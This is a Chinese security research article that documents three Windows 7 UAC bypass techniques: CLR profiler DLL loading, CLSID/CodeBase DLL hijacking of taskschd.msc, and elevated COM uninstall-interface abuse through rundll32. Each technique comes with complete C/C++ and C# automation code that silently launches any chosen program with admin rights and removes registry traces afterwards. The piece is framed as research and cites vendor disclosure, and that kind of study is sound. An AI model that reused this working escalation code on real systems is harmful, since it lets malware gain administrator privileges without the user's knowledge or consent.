***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **UAC(User AccountControl)是从Windows
Vista开始出现的安全技术，它通过限制应用程序的执行权限来达到提升操作系统安全性的目的。在开启UAC的前提下，即使用户使用的是管理员账户登录，默认也只能获取标准权限，当用户某些动作可能会影响系统的安全及稳定性时，UAC便会弹出提示框请求管理员权限，提醒用户该操作属于敏感操作。
然而UAC并不是万能的，否则病毒、木马就不会肆意传播感染了，它们经常利用一些UAC技术上的“漏洞”来实现绕过UAC提示，达到悄悄提权的目的。**

![](https://image.3001.net/images/20180910/1536572518_5b963c66213b0.png!small)

## 一、概述

对此，天融信阿尔法实验室研究员针对UAC绕过的方法进行了研究和整理，网上有很多关于UAC绕过的技术讨论，hfiref0x在github上整理了各种UAC绕过技术的实现：<https://github.com/hfiref0x/UACME>，到目前为止，其整理的技术共有48种，还未修复的有17种。

其中大多都是利用白名单程序绕过UAC。网上也有这方便介绍的帖子，像：

> COM接口利用的：<http://www.freebuf.com/articles/system/116611.html>
>
> .NET程序绕过： <https://offsec.provadys.com/UAC-bypass-dotnet.html>

他们介绍了白名单程序的利用方式，有一定技术功底的可以明白其原理并做到按图索骥的利用，但基础不好的可能要多做几次实验。本文可以看作是上述利用方式的实验记录，详细介绍了几种白名单程序绕过UAC利用的原理、记录其手工实现过程和自动化实现方法。掌握这些，就相当于掌握了”心法”，”招式”就可以随意使用了。

### 测试环境：

Win7 旗舰版 x32 7601

### 工具：

Procmon、WinDbg、IDA、VS2015

### 源码：

<https://github.com/alphaSeclab/bypass-uac>

## 二、CLR加载任意DLL

在所有的提权请求中，有一些程序的提权请求不会触发UAC弹框提示，而是默认允许提权执行，我们称这些程序为微软的白名单程序，这些程序是哪些呢？

![微软的白名单程序](https://image.3001.net/images/20180910/1536572546_5b963c82c0eda.png!small)

控制面板中的管理程序绝大部分都是默认提权运行的，而这些程序中有些并不是可执行文件，而是类似mmc程序的插件文件，找到这些程序的原始位置，发现它们都是以msc为后缀的文件：

![以msc为后缀的文件](https://image.3001.net/images/20180910/1536572556_5b963c8c88b6c.png!small)

双击任一msc文件，通过Procmon监控发现最终运行的都是mmc.exe文件

![mmc.exe文件](https://image.3001.net/images/20180910/1536572560_5b963c9072865.png!small)

在这些msc中，其中有些执行时需要依赖CLR支持，像事件查看器、任务计划程序等。CLR是什么呢？CLR(Common Language
Runtime)，是微软为他们的.NET的虚拟机所选用的名称，.NET程序的运行依赖CLR的支持，就像JAVA的虚拟机。

而CLR有一个Profiling机制(<https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview>)。

>
> 简单来说，就是我们提供一个DLL，当任何高权限的.NET运行时，CLR会主动加载该DLL和运行的程序交互，程序的运行情况都会发送给该DLL，类似于OD调试程序。所以当这些默认提权的管理程序运行时就会被CLR加载我们的提供的DLL，在该DLL中创建的进程、执行的行为也是高权限的行为，从而达到绕过UAC的目的。

那么CLR如何知道怎么加载哪个DLL呢？微软官方文档有介绍: <https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/setting-up-a-profiling-environment>。

### 2.1 添加环境变量

首先，我们添加以下环境变量：

    
    
    COR_ENABLE_PROFILING = 1
    
    COR_PROFILER={CLSIDor ProgID}

CLR会先检查环境变量中COR_ENABLE_PROFILING是否为1，若检查通过，则根据.NET版本不同，查找DLL位置的方法也不同，对于低于4.0的则去注册表中查找CLSID或ProgID项，找到其指定的dll文件路径。从.NET4.0版本开始则先查找环境变量COR_PROFILER_PATH是否指定dll文件路径，没有再去注册表中查找对应的CLSID项。所以这里我们就不设置COR_PROFILER_PATH了，这样不管是.NET
X都让CLR去注册表中找我们的dll。

虽然帮助文档说环境变量COR_PROFILER的值可以是CLSID也可以是任意名称的ProgID,但实际使用时发现只有CLSID测试正常。

添加环境变量的方法即可以通过系统高级设置添加，也可以通过注册表添加：

![通过注册表添加](https://image.3001.net/images/20180910/1536572630_5b963cd6b8a3d.png!small)

![通过注册表添加](https://image.3001.net/images/20180910/1536572634_5b963cdaa870d.png!small)

在用户变量中添加环境变量(操作用户环境变量不需要高权限)：

    
    
    COR_ENABLE_PROFILING=1
    
    COR_PROFILER={12345678-1234-1234-1234-123456789ABC}

这个CLSID是随意取的，只要尽量保证不和已有的CLSID重复即可，如果不放心，可以使用VS自带的GUID生成工具创建一个。

![创建一个](https://image.3001.net/images/20180910/1536572640_5b963ce04c3ce.png!small)

使用注册表添加:

![使用注册表添加](https://image.3001.net/images/20180910/1536572644_5b963ce4899c3.png!small)

### 2.2 注册CLSID

然后我们就可以去注册表中注册我们的CLSID，并设置DLL路径了

找到HKEY_CURRENT_USER\Software\Classes\CLSID项，分别添加以下新项：

![添加新项](https://image.3001.net/images/20180910/1536572649_5b963ce99beb2.png!small)

> {11111111-1111-1111-1111-111111111111}和InprocServer32

设置项InprocServer32的默认值为指定dll路径：

![指定dll路径](https://image.3001.net/images/20180910/1536572653_5b963cedee9f1.png!small)

该dll中只负责运行cmd.exe，并退出主进程：

    
    
    BOOL APIENTRY DllMain ( HMODULE hModule,
                   DWORD  ul_reason_for_call ,
                   LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            WinExec("cmd.exe" , SW_SHOWNORMAL);
            ExitProcess(0);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

现在我们尝试运行gpedit.msc，看能否运行管理员权限的cmd程序：

![gpedit.msc](https://image.3001.net/images/20180910/1536572665_5b963cf914589.png!small)

到此，手工实验成功，成功获取管理员权限且没有UAC弹框。且所有高权限的.NET程序运行时都会加载我们的dll。但这里提权时会影响此后其他.NET程序的正常使用，下面我们把这些步骤自动化，并实现给指定程序提权，且不影响.NET程序的正常使用。

### 2.3 自动化实现

exe程序：

    
    
    int main(int  argc,char* argv[])
    {
        HKEY hKeyExe = NULL ;
        HKEY hEnv = NULL ;
        HKEY hCLSID = NULL ;
        // 1、 注册提权exe地址,dll文件读取该地址执行
        if (argc < 2)
        {
            printf("请指定提权exe文件路径！\n" );
            return 0;
        }
        // 1.1 将需要提权的文件路径注册到HKCU\Software\MyExe下
        int nLen = strlen (argv[1]);
        TCHAR szExePath[MAX_PATH ] = {};
        MultiByteToWideChar(CP_ACP, NULL , argv[1], nLen, szExePath , MAX_PATH);
        TCHAR szKeyName[MAX_PATH ]={ L"Software\\MyExe" };
        long lResult = RegCreateKeyEx (HKEY_CURRENT_USER,
            szKeyName, 0, NULL , REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS| KEY_WOW64_32KEY , NULL, &hKeyExe, NULL );
        if (lResult != ERROR_SUCCESS )
            return 0;
        RegSetValueEx(hKeyExe, NULL , 0, REG_SZ, (BYTE*)szExePath ,nLen*2);
        RegCloseKey(hKeyExe);
        // 2、 添加环境变量
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER ,
            L"Environment", 0, NULL , REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY , NULL, &hEnv, NULL );
        if (lResult != ERROR_SUCCESS )
            return 0;
        RegSetValueEx(hEnv,  L"COR_ENABLE_PROFILING", 0, REG_SZ, (BYTE *)L"1", 2);
        TCHAR wcCLSID[] =  L"{11111111-1111-1111-1111-111111111111}";
        RegSetValueEx(hEnv,  L"COR_PROFILER", 0, REG_SZ, (BYTE*) wcCLSID, wcslen(wcCLSID)*2);
        RegCloseKey(hEnv);
        // 3、 注册CLSID,指定dll路径
        TCHAR szCLSID[MAX_PATH ] = {L"Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InprocServer32"};
        // 演示用，DLL路径固定
        TCHAR szDll[MAX_PATH ] = {L"C:\\Temp\\test.dll"};
        RegCreateKeyEx(HKEY_CURRENT_USER ,
            szCLSID, 0, NULL , REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY , NULL, &hCLSID, NULL );
        RegSetValueEx(hCLSID, NULL , 0, REG_SZ, (BYTE*)szDll , wcslen(szDll)*2);
        RegCloseKey(hCLSID);
        // 4、启动msc程序，加载DLL
        system("mmc.exe gpedit.msc");
        // 5、删除注册的CLSID键，防止影响别的.NET程序运行
        RegDeleteKeyEx(HKEY_CURRENT_USER , szCLSID, KEY_WOW64_32KEY, NULL );
        return 0;
    }
    

dll代码：

    
    
    BOOL APIENTRY  DllMain( HMODULE  hModule,
                          DWORD   ul_reason_for_call,
                          LPVOID  lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            //读取需要提权的exe路径并执行
            HKEY hKeyExe  = NULL;
            TCHAR szExePath [MAX_PATH] = {};
            TCHAR szKeyName [MAX_PATH] = { L"Software\\MyExe" };
            long lResult = RegOpenKeyEx (HKEY_CURRENT_USER,
                szKeyName, 0, KEY_READ  | KEY_WOW64_32KEY, &hKeyExe);
            if (lResult != ERROR_SUCCESS )
                ExitProcess(0);
            DWORD dwSize  = MAX_PATH*2;
            RegQueryValueEx(hKeyExe , NULL, 0, NULL, (BYTE *)szExePath, &dwSize);
            char cPath[MAX_PATH ] = {};
            WideCharToMultiByte(CP_ACP , NULL, szExePath, wcslen (szExePath), cPath, MAX_PATH , NULL, NULL);
            WinExec(cPath,SW_SHOWNORMAL );
            RegCloseKey(hKeyExe );
            ExitProcess(0);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

运行效果图：

![运行效果图](https://image.3001.net/images/20180910/1536572676_5b963d0420d76.png!small)

![运行效果图](https://image.3001.net/images/20180910/1536572679_5b963d070cd4e.png!small)

## 三、DLL劫持

DLL劫持技术经常被恶意程序利用来执行恶意行为，同样，DLL劫持技术原理也可用于UAC绕过。一般PE文件加载DLL依赖项的时候，加载器会在磁盘目录中直接搜索这些DLL文件，.NET程序则不同，因为.NET版本问题，同样的DLL其.NET版本不同，CLR加载这些DLL时会通过注册表中的CLSID项来确定要加载的dll位置，这就给了我们可乘之机，欺骗CLR让其加载我们指定的DLL。默认提权的管理程序加载我们指定的dll后，在dll内就可以执行提权代码了。

### 3.1 寻找目标DLL

以任务计划程序taskschd.msc为例，使用微软提供的工具Procmon筛选LoadImage查看其运行时会加载哪些DLL：

![加载哪些DLL](https://image.3001.net/images/20180910/1536572691_5b963d13eadff.png!small)

上面的红色框内的这种DLL为正常加载的DLL，下面的红色框内带版本的的DLL就是可以被我们利用的DLL。

筛选CLSID相关的注册表操作:

![筛选CLSID相关的注册表](https://image.3001.net/images/20180910/1536572697_5b963d19ae02a.png!small)

找到注册表项路径中含有类似3.0.0.0这样带版本的，其操作的注册表项就是我们要找的目标。

![找到注册表](https://image.3001.net/images/20180910/1536572706_5b963d22d98d8.png!small)

其中Assmbly的值由dll名称、该DLL的.NET版本、语言及其token组成，观察LoadImage图中的DLL路径就会发现其路径中的值是由Assembly组成。其实CLR搜索注册表项时，DLL路径不仅可以由Assmbly指定，还可以由CodeBase值指定，由于我们不能操作系统目录，所以CodeBase值就对我们很有用了。

![](https://image.3001.net/images/20180910/1536572717_5b963d2d0ff73.png!small)

Class为加载该DLL时访问的类。我们可以通过该类的静态构造函数来执行目标代码。

InprocServer32下的子键3.0.0.0中的值和InprocServer32值相似：

![](https://image.3001.net/images/20180910/1536572722_5b963d326f343.png!small)

我们只需要将DLL名和类名指定为我们自己的DLL名和类名，并由“CodeBase“指定DLL路径就可以达到欺骗CLR加载我们自己的DLL的目的。但是注意不要直接操作该注册表项，因为其根键为HKCR，HKCR中的CLSID由HKLM和HKCU下的Software\Classes\CLSID组成，我们假想中的环境是没有操作HKLM的权限的，所以要在HKCU中建立类似的项。

### 3.2 DLL劫持

在HKEY_CURRENT_USER\Software\Classes\CLSID下添加子键{D5AB5662-131D-453D-88C8-9BBA87502ADE}，并将HKEY_CLASSES_ROOT\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}键的值依次拷贝到新建项下。

准备C#编译的DLL，注意.NET版本要和上图中Assembly指定的一致：

![准备C#编译的DLL](https://image.3001.net/images/20180910/1536572730_5b963d3af2174.png!small)

DLL中启动CMD然后退出加载DLL的进程(这里指taskschd.msc)

    
    
    namespace CLSID
    {
          public class Class1
          {
                 static Class1()
                 {
                         Process.Start("cmd.exe"); 
                         Environment.Exit(0);
                         }
                 } 
    } 

编译生成后拷贝到C:\Temp\CLSID.dll

将注册表中的InprocServer32和3.0.0.0中的值改为我们的DLL信息，并由CodeBase指定DLL路径：

![由CodeBase指定DLL路径](https://image.3001.net/images/20180910/1536572738_5b963d4223e4a.png!small)

运行taskschd.msc后成功弹出提权后的cmd命令行：

![cmd命令行](https://image.3001.net/images/20180910/1536572741_5b963d457ae73.png!small)

### 3.3 自动化实现

下面我们实现其自动化代码，实现提权指定程序，并清理注册表痕迹，不影响mmc程序的正常运行：

EXE代码：

    
    
    int main(int  argc, char* argv[])
    {
        HKEY hKeyExe = NULL ;
        HKEY hKeyCLSIDSrc = NULL ;
        HKEY hKeyCLSIDDes = NULL ;
        // 1、 注册提权exe地址,dll文件读取该地址执行
        if (argc < 2)
        {
            printf("请指定提权exe文件路径！\n" );
            return 0;
        }
        // 1.1 将需要提权的EXE文件路径注册到HKCU\Software\MyExe下
        int nLen = strlen (argv[1]);
        TCHAR szExePath[MAX_PATH ] = {};
        MultiByteToWideChar(CP_ACP, NULL , argv[1], nLen, szExePath , MAX_PATH);
        TCHAR szKeyName[MAX_PATH ] = { L"Software\\MyExe" };
        long lResult = RegCreateKeyEx (HKEY_CURRENT_USER,
            szKeyName, 0, NULL , REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY , NULL, &hKeyExe, NULL );
        if (lResult != ERROR_SUCCESS )
            return 0;
        RegSetValueEx(hKeyExe, NULL , 0, REG_SZ, (BYTE*)szExePath , nLen * 2);
        RegCloseKey(hKeyExe);
        // 2、 拷贝并修改CLSID,指定dll路径
        // 2.1、拷贝
        TCHAR szCLSIDSrc[MAX_PATH ] = { L"CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}" };
        TCHAR szCLSIDDes[MAX_PATH ] = { L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}" };
     
        RegOpenKeyEx(HKEY_CLASSES_ROOT , szCLSIDSrc, 0, KEY_READ|KEY_WOW64_32KEY , &hKeyCLSIDSrc);
        RegCreateKeyEx(HKEY_CURRENT_USER , szCLSIDDes, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS  | KEY_WOW64_32KEY, NULL, & hKeyCLSIDDes, NULL);
     
        RegCopyTree(hKeyCLSIDSrc, NULL , hKeyCLSIDDes);
        RegCloseKey(hKeyCLSIDSrc);
        RegCloseKey(hKeyCLSIDDes);
        // 2.2、 修改
        TCHAR *szSubKey[] = {  L"\\InprocServer32" ,L"\\3.0.0.0" };
        for (int  i=0;i<2;++i)
        {
            wcscat_s(szCLSIDDes , MAX_PATH, szSubKey[i ]);
            RegOpenKeyEx(HKEY_CURRENT_USER , szCLSIDDes, 0, KEY_SET_VALUE | KEY_WOW64_32KEY , &hKeyCLSIDDes);
     
            DWORD cbData  = (DWORD)((1 + wcslen(L"CLSID, Version=3.0.0.0, Culture=neutral" )) * sizeof(WCHAR));
            lResult = RegSetValueEx (hKeyCLSIDDes, L"Assembly", 0,
                REG_SZ, (BYTE *)L"CLSID, Version=3.0.0.0, Culture=neutral", cbData);
     
            cbData = (DWORD )((1 + wcslen(L"CLSID.Class1")) * sizeof (WCHAR));
            lResult = RegSetValueEx (hKeyCLSIDDes, L"Class", 0,
                REG_SZ, (BYTE *)L"CLSID.Class1", cbData);
     
            cbData = (DWORD )((1 + wcslen(L"file://c://Temp//CLSID.dll")) *  sizeof(WCHAR));
            lResult = RegSetValueEx (hKeyCLSIDDes, L"CodeBase", 0,
                REG_SZ, (BYTE *)L"file://c://Temp//CLSID.dll", cbData);
     
            RegCloseKey(hKeyCLSIDDes );
        }
        // 3、启动msc程序，加载DLL
        system("mmc.exe taskschd.msc");
        // 4、删除注册的CLSID键，防止影响正常程序运行
        RegOpenKeyEx(HKEY_CURRENT_USER , L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}", 0,
            DELETE| KEY_ENUMERATE_SUB_KEYS  |KEY_QUERY_VALUE | KEY_WOW64_32KEY, & hKeyCLSIDDes);
        RegDeleteTree(hKeyCLSIDDes, NULL );
        RegDeleteKeyEx(HKEY_CURRENT_USER , L"Software\\Classes\\CLSID\\{D5AB5662-131D-453D-88C8-9BBA87502ADE}", KEY_WOW64_32KEY , NULL);
        return 0;
    }

DLL代码(注意.NET版本)：

    
    
    namespace CLSID
    {
        public class  Class1
        {
            static Class1()
            {
                RegistryKey Key  = Registry.CurrentUser.OpenSubKey ("Software\\MyExe", false);
                string CustomParam  = Key.GetValue("" ).ToString();
                Key.Close ();
                Process.Start (CustomParam);
                Environment.Exit (0);
            }
        }
    }

运行效果，可指定任意exe程序：

![运行效果](https://image.3001.net/images/20180910/1536572770_5b963d6296fce.png!small)

## 四、COM接口绕过UAC

上面两种方法利用的都是mmc.exe程序绕过UAC，其实在%systemroot%下有很多exe程序都是windows系统的白名单程序，像cmd.exe、calc.exe等，但是这些程序和mmc.exe不同，如果在这些程序上右键以管理员权限运行，他们同样会触发UAC弹框提示，那像这样的白名单还有什么用处呢？

### 4.1 原理介绍

我们卸载程序时，如果直接运行卸载程序，则会触发弹框提示：

![触发弹框提示](https://image.3001.net/images/20180910/1536572781_5b963d6d6b320.png!small)

但是通过控制面板的卸载程序窗口卸载程序时却不会触发UAC弹框提示，我们利用WinDbg跟踪explorer.exe查看它是如何提权运行卸载程序的：

![利用WinDbg跟踪explorer.exe](https://image.3001.net/images/20180910/1536572785_5b963d71de54e.png!small)

explorer.exe最终调用的是appwiz模块中的接口实现提权，那么我们是否可以同样调用该接口实现绕过提权呢？用IDA分析appwiz模块查看其函数调用过程：

![用IDA分析appwiz模块](https://image.3001.net/images/20180910/1536572791_5b963d779008f.png!small)

发现找不到CARPUninstallStringLauncher::LaunchUninstallStringAndWait，该接口未导出(windbg能识别是因为加载了符号文件)。手动加载符号文件(已提供在源码中，版本win7_32_7601)：

![手动加载符号文件](https://image.3001.net/images/20180910/1536572799_5b963d7f452ea.png!small)

由windbg调用栈可知，该函数由CInstalledAapp::_CreateAppModifyProcess调用，找到调用返回位置：函数地址偏移+0x244

![函数地址偏移+0x244](https://image.3001.net/images/20180910/1536572820_5b963d9487b5a.png!small)

![函数地址偏移+0x244](https://image.3001.net/images/20180910/1536572823_5b963d973aeb6.png!small)

F5转到伪代码：

![F5转到伪代码](https://image.3001.net/images/20180910/1536572828_5b963d9c18a9f.png!small)

像是虚函数的调用，回到CARPUninstallStringLauncher::LaunchUninstallStringAndWait函数，找到其虚函数表：

![找到其虚函数表](https://image.3001.net/images/20180910/1536572832_5b963da086c56.png!small)

![找到其虚函数表](https://image.3001.net/images/20180910/1536572835_5b963da3a189c.png!small)

虚函数表的结构找到了，如果找到获取CARPUninstallStringLauncher实例的方法，就可以直接调用该函数实现提权了。回到调用该函数的地方CInstalledAapp::_CreateAppModifyProcess：

![虚函数表的结构](https://image.3001.net/images/20180910/1536572841_5b963da951d4b.png!small)

this的获取方法和COM接口调用相同：通过CLSID和IID。上图中，获取PPV的方法有两个，但我们知道CoCreateInstance并不能提权，CoCreateInstanceAsAdminWithCorrectBitness函数名更像是我们需要的函数，查看其函数实现：

![查看其函数实现](https://image.3001.net/images/20180910/1536572848_5b963db0c795f.png!small)

这样PPV的获取方法和调用进程的接口都找到后，我们就可以代码实现了。

定义接口变量类型：

    
    
    struct IARPUninstallStringLauncher;
    typedef struct IARPUninstallStringLauncherVtbl  {
        HRESULT(_stdcall * QueryInterface)(
                __RPC__in IARPUninstallStringLauncher  * This,
                __RPC__in REFIID  riid,
                _COM_Outptr_  void  **ppvObject);
     
        ULONG(_stdcall * AddRef)(
            __RPC__in IARPUninstallStringLauncher  * This);
     
        ULONG(_stdcall * Release)(
            __RPC__in IARPUninstallStringLauncher  * This);
     
        HRESULT(_stdcall * LaunchUninstallStringAndWait)(
            __RPC__in IARPUninstallStringLauncher  * This,
            _In_ HKEY  hKey,
            _In_ LPCOLESTR  Item,
            _In_ BOOL  bModify,
            _In_ HWND  hWnd);
     
        HRESULT(_stdcall * RemoveBrokenItemFromInstalledProgramsList)(
            __RPC__in IARPUninstallStringLauncher  * This,
            _In_ HKEY  hKey,
            _In_ LPCOLESTR  Item);
    }IARPUNINSTALLSTRINGLAUNCHERVTBL, *PIARPUNINSTALLSTRINGLAUNCHERVTBL;
     
    typedef struct IARPUninstallStringLauncher
    {
        IARPUninstallStringLauncherVtbl *lpVtbl;
    }IARPUNINSTALLSTRINGLAUNCHER,*PIARPUNINSTALLSTRINGLAUNCHER;

逻辑代码：

    
    
    int _tmain(int  argc, _TCHAR* argv [])
    {
        CLSID  clsid;
        IID iid;
        HRESULT hr;
        BIND_OPTS3 bo;
        WCHAR  szElevationMoniker [300];
        PIARPUNINSTALLSTRINGLAUNCHER ppv;
        // 获取提权com接口
        if (IIDFromString( L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &clsid) ||
            IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}" , &iid))
            return 0;
        CoInitialize(NULL);
        hr = StringCchPrintf( szElevationMoniker, sizeof(szElevationMoniker) /  sizeof(szElevationMoniker[0]),
            L"Elevation:Administrator!new:%s", L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}" );
        if (FAILED( hr))
            return 0;
        memset(&bo, 0,  sizeof(bo));
        bo.cbStruct =  sizeof(bo);
        bo.dwClassContext = CLSCTX_LOCAL_SERVER ;
        hr = CoGetObject( szElevationMoniker, &bo, iid, ( void**)&ppv);
        // 调用HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\下的test程序
        if (SUCCEEDED( hr))
        {
                ppv->lpVtbl ->LaunchUninstallStringAndWait(ppv, 0, L"test" , 0, NULL);
                ppv->lpVtbl ->Release(ppv);
        }
        CoUninitialize();
        return 0;
    }

因为我们是以卸载的方式调用指定程序，代码中调用的是“test”卸载项，所以需要在注册表位置HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall中新建test项：

![以卸载的方式调用指定程序](https://image.3001.net/images/20180910/1536572886_5b963dd633ef7.png!small)

运行后发现能成功提权，但是有UAC提示框，为什么呢？上面的代码和程序卸载面板的唯一区别就是运行提权的进程不同，卸载时使用的是explorer.exe进程，这时候就体现出explorer.exe这些白名单的特权：不触发UAC弹框提示。

所以，要实现提权操作需要两个东西：COM提权接口和白名单程序。

怎么让白名单程序调用我们上面的函数呢：dll注入或payload注入，但是对于白名单进程注入这种敏感操作会引起主流杀软的拦截提醒，所以一般采用另一种方法：封装成DLL利用rundll32加载该dll，因为rundll32也是白名单程序，COM接口提权不会触发UAC弹框。

### 4.2 自动化实现

rundll32.exe加载的dll比需有如下原型的导出函数：

    
    
    void CALLBACK FunctionName (
        HWND hwnd,
        HINSTANCE hinst,
        LPTSTR lpCmdLine,
        INT nCmdShow
    );
    

当运行“rundll32.exedll名,函数名
命令行参数”,rundll32就会加载该dll，并把命令行参数作为导出函数的第3个参数传递给该函数并调用它，我们只需要将上面的逻辑代码写在该导出函数里，然后调用rundll32即可：

更改后的exe代码：

    
    
    int main(int  argc, char* argv [])
    {
        HKEY hKeyExe = NULL ;
        if (argc < 2)
        {
            printf(" 请指定提权exe文件路径！\n");
            return 0;
        }
        // 1. 将需要提权的文件路径注册到HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\test下
        int nLen = strlen (argv[1]);
        TCHAR szExePath[MAX_PATH ] = {};
        MultiByteToWideChar(CP_ACP , NULL, argv[1], nLen , szExePath, MAX_PATH);
        TCHAR szKeyName[MAX_PATH ] = { L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\test" };
        long lResult = RegCreateKeyEx (HKEY_CURRENT_USER,
            szKeyName, 0, NULL , REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY , NULL, &hKeyExe, NULL );
        if (lResult != ERROR_SUCCESS )
            return 0;
        RegSetValueEx(hKeyExe,  L"DisplayName", 0, REG_SZ, (BYTE*) L"test", 10);
        RegSetValueEx(hKeyExe,  L"UninstallString", 0, REG_SZ, (BYTE *)szExePath, (nLen+1)*2);
        RegCloseKey(hKeyExe);
        // 2 调用rundll32
        system("rundll32.exe com_dll.dll,ElevFunc" );
        return 0;
    }

封装的dll代码(将第1次的main函数的代码封装到导出函数即可，注意给导出函数有前后缀，给其取个别名方便调用)：

    
    
    #pragma comment(linker, "/export:ElevFunc=_ElevFunc@16" )
    extern "C" _declspec (dllexport) void CALLBACK  ElevFunc(
        HWND hwnd,
        HINSTANCE hinst,
        LPTSTR lpCmdLine,
        INT nCmdShow
    ) {
        CLSID  clsid;
        IID iid;
        HRESULT hr;
        BIND_OPTS3 bo;
        WCHAR  szElevationMoniker [300];
        PIARPUNINSTALLSTRINGLAUNCHER ppv;
        // 获取提权com接口
        if (IIDFromString( L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &clsid) ||
            IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}" , &iid))
            return;
        CoInitialize(NULL);
        hr = StringCchPrintf( szElevationMoniker, sizeof(szElevationMoniker) /  sizeof(szElevationMoniker[0]),
            L"Elevation:Administrator!new:%s", L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}" );
        if (FAILED( hr))
            return;
        memset(&bo, 0,  sizeof(bo));
        bo.cbStruct =  sizeof(bo);
        bo.dwClassContext = CLSCTX_LOCAL_SERVER ;
        hr = CoGetObject( szElevationMoniker, &bo, iid, ( void**)&ppv);
        // 调用HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\下的test程序
        if (SUCCEEDED( hr))
        {
            ppv->lpVtbl-> LaunchUninstallStringAndWait(ppv, 0, L"test", 0, NULL );
            ppv->lpVtbl-> Release(ppv);
        }
        CoUninitialize();
        ExitProcess(0);
        return;
    }

运行效果如下：

![](https://image.3001.net/images/20180910/1536572903_5b963de723eb3.png!small)

## 五、总结

CLS加载任意dll虽然方便：任意高权限.NET程序都会加载dll执行提权代码，但涉及环境变量的操作是敏感操作，会被主流杀软拦截；DLL劫持相比CLS来说比较“专一”了，只有依赖指定dll的.NET程序才会被劫持加载。而且不会引起主流杀软拦截；COM接口绕过选择度比较高，不想依赖DLL就选择payload注入，但会引起拦截，利用rundll32运行则需要dll依赖，但不会引起拦截，且自由度比CLR和DLL劫持自由度更高，不会影响其他程序的正常运行。

这几种方法只是绕过UAC的多种方法的一部分，但从这也可以看出，UAC并不能提供足够的安全防护，所以不要过于信赖UAC，养成良好的安全意识和操作习惯更重要。

## 六、参考资料

> <https://github.com/hfiref0x/UACME>
>
> <https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/>
>
> <https://offsec.provadys.com/UAC-bypass-dotnet.html>
>
> <http://www.freebuf.com/articles/system/116611.html>

***本文作者：alphalab，转载请注明来自FreeBuf.COM**

